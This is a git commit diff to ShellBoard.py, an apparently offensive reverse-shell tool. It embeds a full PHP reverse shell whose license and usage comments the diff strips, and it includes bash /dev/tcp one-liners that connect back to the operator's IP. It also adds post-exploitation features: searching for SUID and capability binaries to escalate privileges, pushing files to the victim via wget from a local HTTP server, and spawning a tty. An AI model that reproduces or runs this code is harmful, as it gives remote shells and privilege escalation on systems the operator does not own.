c865f422f44e2d079df466591ca471b4fd4124a5
Ph3nX-Z <66122220+Ph3nX-Z@users.noreply.github.com>
2021-05-03 17:52:29 +0200

    Add files via upload

--- ShellBoard.py
+++ ShellBoard.py
@@ -12,49 +12,6 @@ reversephp = '''
 <?php
 // php-reverse-shell - A Reverse Shell implementation in PHP
 // Copyright (C) 2007 pentestmonkey@pentestmonkey.net
-//
-// This tool may be used for legal purposes only.  Users take full responsibility
-// for any actions performed using this tool.  The author accepts no liability
-// for damage caused by this tool.  If these terms are not acceptable to you, then
-// do not use this tool.
-//
-// In all other respects the GPL version 2 applies:
-//
-// This program is free software; you can redistribute it and/or modify
-// it under the terms of the GNU General Public License version 2 as
-// published by the Free Software Foundation.
-//
-// This program is distributed in the hope that it will be useful,
-// but WITHOUT ANY WARRANTY; without even the implied warranty of
-// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
-// GNU General Public License for more details.
-//
-// You should have received a copy of the GNU General Public License along
-// with this program; if not, write to the Free Software Foundation, Inc.,
-// 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.
-//
-// This tool may be used for legal purposes only.  Users take full responsibility
-// for any actions performed using this tool.  If these terms are not acceptable to
-// you, then do not use this tool.
-//
-// You are encouraged to send comments, improvements or suggestions to
-// me at pentestmonkey@pentestmonkey.net
-//
-// Description
-// -----------
-// This script will make an outbound TCP connection to a hardcoded IP and port.
-// The recipient will be given a shell running as the current user (apache normally).
-//
-// Limitations
-// -----------
-// proc_open and stream_set_blocking require PHP version 4.3+, or 5+
-// Use of stream_select() on file descriptors returned by proc_open() will fail and return FALSE under Windows.
-// Some compile-time options are needed for daemonisation (like pcntl, posix).  These are rarely available.
-//
-// Usage
-// -----
-// See http://pentestmonkey.net/tools/php-reverse-shell if you get stuck.
-
 set_time_limit (0);
 $VERSION = "1.0";
 $ip = "$$ip$$";  // CHANGE THIS
@@ -66,14 +23,7 @@ $shell = 'uname -a; w; id; /bin/sh -i';
 $daemon = 0;
 $debug = 0;
 
-//
-// Daemonise ourself if possible to avoid zombies later
-//
-
-// pcntl_fork is hardly ever available, but will allow us to daemonise
-// our php process and avoid zombies.  Worth a try...
 if (function_exists('pcntl_fork')) {
-	// Fork and have the parent process exit
 	$pid = pcntl_fork();
 
 	if ($pid == -1) {
@@ -85,8 +35,6 @@ if (function_exists('pcntl_fork')) {
 		exit(0);  // Parent exits
 	}
 
-	// Make the current process a session leader
-	// Will only succeed if we forked
 	if (posix_setsid() == -1) {
 		printit("Error: Can't setsid()");
 		exit(1);
@@ -97,24 +45,12 @@ if (function_exists('pcntl_fork')) {
 	printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
 }
 
-// Change to a safe directory
-chdir("/");
-
-// Remove any umask we inherited
-umask(0);
-
-//
-// Do the reverse shell...
-//
-
-// Open reverse connection
 $sock = fsockopen($ip, $port, $errno, $errstr, 30);
 if (!$sock) {
 	printit("$errstr ($errno)");
 	exit(1);
 }
 
-// Spawn shell process
 $descriptorspec = array(
    0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
    1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
@@ -128,8 +64,6 @@ if (!is_resource($process)) {
 	exit(1);
 }
 
-// Set everything to non-blocking
-// Reason: Occsionally reads will block, even though stream_select tells us they won't
 stream_set_blocking($pipes[0], 0);
 stream_set_blocking($pipes[1], 0);
 stream_set_blocking($pipes[2], 0);
@@ -138,25 +72,21 @@ stream_set_blocking($sock, 0);
 printit("Successfully opened reverse shell to $ip:$port");
 
 while (1) {
-	// Check for end of TCP connection
 	if (feof($sock)) {
 		printit("ERROR: Shell connection terminated");
 		break;
 	}
 
-	// Check for end of STDOUT
 	if (feof($pipes[1])) {
 		printit("ERROR: Shell process terminated");
 		break;
 	}
 
-	// Wait until a command is end down $sock, or some
-	// command output is available on STDOUT or STDERR
+
 	$read_a = array($sock, $pipes[1], $pipes[2]);
 	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);
 
-	// If we can read from the TCP socket, send
-	// data to process's STDIN
+
 	if (in_array($sock, $read_a)) {
 		if ($debug) printit("SOCK READ");
 		$input = fread($sock, $chunk_size);
@@ -164,8 +94,6 @@ while (1) {
 		fwrite($pipes[0], $input);
 	}
 
-	// If we can read from the process's STDOUT
-	// send data down tcp connection
 	if (in_array($pipes[1], $read_a)) {
 		if ($debug) printit("STDOUT READ");
 		$input = fread($pipes[1], $chunk_size);
@@ -173,8 +101,6 @@ while (1) {
 		fwrite($sock, $input);
 	}
 
-	// If we can read from the process's STDERR
-	// send data down tcp connection
 	if (in_array($pipes[2], $read_a)) {
 		if ($debug) printit("STDERR READ");
 		$input = fread($pipes[2], $chunk_size);
@@ -189,8 +115,6 @@ fclose($pipes[1]);
 fclose($pipes[2]);
 proc_close($process);
 
-// Like print, but does nothing if we've daemonised ourself
-// (I can't figure out how to redirect STDOUT like a proper daemon)
 function printit ($string) {
 	if (!$daemon) {
 		print "$string\n";
@@ -206,11 +130,117 @@ function printit ($string) {
 with open("reverse.php","w") as file:
 	file.write(reversephp)
 
+def auto_decal():
+	print("----- Auto Decal -----")
+	decal = True
+	results = ""
+	client_socket.send(("echo '<decal>'"+"\n").encode())
+	compteur = 0
+	while not "<decal>" in results:
+		print("Shell preview :",results)
+		if compteur>0:
+			print("Shell not synchronized")
+		results = client_socket.recv(buffer).decode()
+		compteur += 1
+	while True:
+		results = client_socket.recv(buffer).decode()
+		if shell in results:
+			break
+	print("Shell synchronized")
+	print("----- End Auto Decal ------")
+
+def exploit_bin():
+	global client_socket
+	global shell_type
+	global shell
+	global buffer
+	exploitable_list = []
+	list = {'apt-get', 'apt', 'ar', 'aria2c', 'arp', 'ash', 'at', 'atobm', 'awk', 'base32', 'base64', 'basenc', 'bash', 'bpftrace', 'bridge', 'bundler', 'busctl', 'busybox', 'byebug', 'cancel', 'capsh', 'cat', 'certbot', 'check_by_ssh', 'check_cups', 'check_log', 'check_memory', 'check_raid', 'check_ssl_cert', 'check_statusfile', 'chmod', 'chown', 'chroot', 'cobc', 'column', 'comm', 'composer', 'cowsay', 'cowthink', 'cp', 'cpan', 'cpio', 'cpulimit', 'crash', 'crontab', 'csh', 'csplit', 'csvtool', 'cupsfilter', 'curl', 'cut', 'dash', 'date', 'dd', 'dialog', 'diff', 'dig', 'dmesg', 'dmsetup', 'dnf', 'docker', 'dpkg', 'dvips', 'easy_install', 'eb', 'ed', 'emacs', 'env', 'eqn', 'ex', 'exiftool', 'expand', 'expect', 'facter', 'file', 'find', 'finger', 'flock', 'fmt', 'fold', 'ftp', 'gawk', 'gcc', 'gdb', 'gem', 'genisoimage', 'ghc', 'ghci', 'gimp', 'git', 'grep', 'gtester', 'gzip', 'hd', 'head', 'hexdump', 'highlight', 'hping3', 'iconv', 'iftop', 'install', 'ionice', 'ip', 'irb', 'jjs', 'join', 'journalctl', 'jq', 'jrunscript', 'ksh', 'ksshell', 'latex', 'ld.so', 'ldconfig', 'less', 'logsave', 'look', 'ltrace', 'lua', 'lualatex', 'luatex', 'lwp-download', 'lwp-request', 'mail', 'make', 'man', 'mawk', 'more', 'mount', 'mtr', 'mv', 'mysql', 'nano', 'nawk', 'nc', 'nice', 'nl', 'nmap', 'node', 'nohup', 'npm', 'nroff', 'nsenter', 'octave', 'od', 'openssl', 'openvpn', 'openvt', 'paste', 'pdb', 'pdflatex', 'pdftex', 'perl', 'pg', 'php', 'pic', 'pico', 'pip', 'pkexec', 'pkg', 'pr', 'pry', 'psql', 'puppet', 'python', 'rake', 'readelf', 'red', 'redcarpet', 'restic', 'rev', 'rlogin', 'rlwrap', 'rpm', 'rpmquery', 'rsync', 'ruby', 'run-mailcap', 'run-parts', 'rview', 'rvim', 'scp', 'screen', 'script', 'sed', 'service', 'setarch', 'sftp', 'sg', 'shuf', 'slsh', 'smbclient', 'snap', 'socat', 'soelim', 'sort', 'split', 'sqlite3', 'ss', 'ssh-keygen', 'ssh-keyscan', 'ssh', 'start-stop-daemon', 'stdbuf', 'strace', 'strings', 'su', 'sysctl', 'systemctl', 'tac', 'tail', 'tar', 'taskset', 'tbl', 'tclsh', 'tcpdump', 'tee', 'telnet', 'tex', 'tftp', 'time', 'timeout', 'tmux', 'top', 'troff', 'ul', 'unexpand', 'uniq', 'unshare', 'update-alternatives', 'uudecode', 'uuencode', 'valgrind', 'vi', 'view', 'vigr', 'vim', 'vimdiff', 'vipw', 'virsh', 'watch', 'wc', 'wget', 'whois', 'wish', 'xargs', 'xelatex', 'xetex', 'xmodmap', 'xxd', 'xz', 'yelp', 'yum', 'zip', 'zsh', 'zsoelim', 'zypper'}
+	client_socket.send(("find / -perm -u=s 2>/dev/null"+"\n").encode())
+	print("suid :")
+	while True:
+		results = client_socket.recv(buffer).decode()
+		if shell in results:
+			break
+		for i in results.split("/"):
+			try:
+				if i.replace("\r\n","").replace("\n","").replace("\r","") in list:
+					print(results).split("\r\n")[0]
+			except AttributeError:
+				pass
+	print("capabilities :")
+	client_socket.send(("getcap / -r 2>/dev/null"+"\n").encode())
+	while True:
+		results = client_socket.recv(buffer).decode()
+		if shell in results:
+			break
+		for i in list:
+			if i in results:
+				print(results)
+def clean_shell_type(shell):
+	if "\r\n" in shell:
+		shell = shell.split("\r\n")
+	elif "\n" in shell:
+		shell = shell.split("\n")
+	elif "\r" in shell:
+		shell = shell.split("\r")
+	for i in shell:
+		if not "echo $0" in i:
+			return i
+	return shell
+
+def deliver_file():
+	import time
+	print("----- File Deliver -----")
+	print(f"You are currently in :{os.getcwd()}")
+	print(f"Displaying disponible files : {', '.join([i for i in glob.glob('*.*')])}")
+	import random
+	port = random.randint(8000,9000)
+	file = input("Which file do you want to upload ? :")
+	os.system(f"python3 -m http.server {port} &")
+	print("Waiting 3 seconds for the server to start")
+	time.sleep(3)
+	print("Delivering file")
+	client_socket.send((f"wget http://{ip}:{port}/{file}"+"\n").encode())
+	results = ""
+	while not shell in results:
+		print(results)
+		results = client_socket.recv(buffer).decode()
+	print("Done")
+	print("----- End File Deliver -----")
+
+
+def detect_shell_type():
+	global client_socket
+	global shell_type
+	global shell
+	global buffer
+
+	print("detecting shell type")
+	liste_shell = []
+	client_socket.send(("echo $0"+"\n").encode())
+	liste_shell.append(client_socket.recv(buffer).decode())
+	liste_shell.append(client_socket.recv(buffer).decode())
+	for i in liste_shell:
+		if i != "" and i!= shell and i!="echo $0" :
+			shell_type = i
+	shell_type = clean_shell_type(shell_type)
+	print("shell type :",shell_type)
+	if 'bash' in shell_type.split('\r')[0].split("/"):
+		shell = shell.split(":")[0].split(";")[1]
+	elif "sh" in shell_type.split("\r")[0].split("/"):
+		shell = shell
+	elif "zsh" in shell_type.split("\r")[0].split("/"):
+		print("Zsh Not implemented")
+		pass
+	else:
+		print("Cannot detect")
+
 def tty():
+	print("----- Invoke tty -----")
 	global shell
 	global command_pannel
 	temp_shell = shell
-	print("Invoking tty")
 	client_socket.send(("python3 -c 'import pty;pty.spawn(\"/bin/bash\")'"+"\n").encode())
 	while True:
 		results = client_socket.recv(buffer).decode()
@@ -233,13 +263,16 @@ def tty():
 	else:
 		print("tty spawned")
 		shell = results
-		command_pannel = False
+	detect_shell_type()
+	command_pannel = False
+	print("----- End Invoke tty -----")
+
 def start_listener(port):
 	global client_socket
 	global buffer
 	global shell
 	global command_pannel
-
+	global s
 	host = "0.0.0.0"
 	port = port
 	buffer = 1024
@@ -253,19 +286,23 @@ def start_listener(port):
 
 	results = "a"
 	shell = client_socket.recv(buffer).decode()
+
+	#print("shell :",shell)
+
+	shell_to_display = shell
+
 	command_pannel = True
 
 	disponible_commands = ["\n-> Exploitation:","shell  : Invoke shell","\n-> Interface:","exit  : kill the reverse shell","other  : Display specific commands", "\n-> Inside Rev Shell Commands:","#help  : Display help message"]
-	other_commands = {"tty":"Invoke tty"}
-	shell_commands = ["#help  : Display this message","#kill  : Exit the reverse shell and the program", "#exit  : Return to command panel"]
+	other_commands = {"tty":"Invoke tty","exploit_bin":"Search for exploitable binaries","deliver_file":"Upload files"}
+	shell_commands = ["#help  : Display this message","#kill  : Exit the reverse shell and the program", "#exit  : Return to command panel","#decal  : decal shell commands if not synchronized","#other:command  : use command panel's commands"]
 
-
+	tty()
+	auto_decal()
 	while True:
 		if command_pannel == False:
 			liste = []
-			command = input(shell)
-			if "sudo" in command.split(" "):
-				tty()
+			command = input(shell_to_display)
 			client_socket.send((command+"\n").encode())
 			if command.lower() == "#kill":
 				client_socket.send(("exit"+"\n").encode())
@@ -275,6 +312,13 @@ def start_listener(port):
 			elif command.lower() == "#help":
 				for i in shell_commands:
 					print(i)
+			elif command.lower() == "#decal":
+				print(client_socket.recv(buffer).decode())
+			elif "#other:" in command.lower():
+				command = command.split(":")[1]
+				command_pannel = True
+				exec(f'{command}()')
+				command_pannel = False
 			elif command.lower() == "exit":
 				break
 			sudo = False
@@ -295,6 +339,7 @@ def start_listener(port):
 			while "" in liste:
 				liste.remove("")
 			print("\n".join(liste[:-1]))
+			shell_to_display = results.split("\n")[-1]
 		elif command_pannel == True:
 			command = input(">>")
 			if command == "help":
@@ -303,10 +348,11 @@ def start_listener(port):
 			elif command == "shell":
 				command_pannel = False
 			elif command == "exit":
+				client_socket.send(("exit"+"\n").encode())
 				break
 			elif command == "other":
 				for i in other_commands.keys():
-					print(i)
+					print(f"{i} : {other_commands[i]}")
 			elif command in other_commands:
 				exec(command+f"()")
 			elif command not in other_commands:
@@ -331,16 +377,19 @@ banner = """
 def clear():
         os.system("clear")
         print(banner)
-
+global ip
 try:
 	ip = ni.ifaddresses("tun0")[ni.AF_INET][0]['addr']
 except:
 	try:
 		ip = ni.ifaddresses("eth0")[ni.AF_INET][0]['addr']
 	except:
-		ip = input("The Listening ip")
+		try:
+			ip = ni.ifaddresses("wlan0")[ni.AF_INET][0]['addr']
+		except:
+			ip = input("The Listening ip :")
 choice1 = 1000
-port = 1234
+port = 1235
 clear()
 
 bash = {1:f"bash -i >& /dev/tcp/{ip}/{port} 0>&1",2:f"0<&196;exec 196<>/dev/tcp/{ip}/{port}; sh <&196 >&196 2>&196",3:f"sh -i >& /dev/udp/{ip}/{port} 0>&1"}
@@ -385,13 +434,19 @@ else:
 if input("Would you like to start a listener ? y/n :").upper()=="Y":
 	try:
 		if input("1.Netcat (No Tools)\n2.Custom Listener (Post exploitation Tools)\nYour Choice :")==1:
-			os.system("nc -nvlp 1234")
+			os.system(f"nc -nvlp {port}")
 		else:
-			start_listener(port)
+				start_listener(port)
 	except KeyboardInterrupt:
 		print("Cancelled by user")
 else:
 	print("Ended")
 
-
+global client_socket
+global s
+try:
+	client_socket.close()
+	s.close()
+except:
+	pass
 os.remove("reverse.php")
